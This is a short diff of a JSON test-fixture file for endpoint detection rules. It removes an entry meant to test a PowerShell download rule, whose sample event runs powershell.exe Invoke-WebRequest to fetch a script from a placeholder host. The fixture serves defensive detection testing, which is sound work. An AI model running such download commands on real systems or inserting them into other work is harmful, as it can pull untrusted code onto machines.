@@ -54,14 +54,5 @@
       "ImagePath": "C:\\Program Files\\Northstar\\support.exe"
     },
     "expected_match": true
-  },
-  {
-    "rule_id": "6d92da14-9804-4490-9382-a74241262c17",
-    "description": "Intentional behavioral failure for PowerShell download rule",
-    "event": {
-      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-      "CommandLine": "powershell.exe Invoke-WebRequest https://example.invalid/update.ps1"
-    },
-    "expected_match": true
   }
 ]
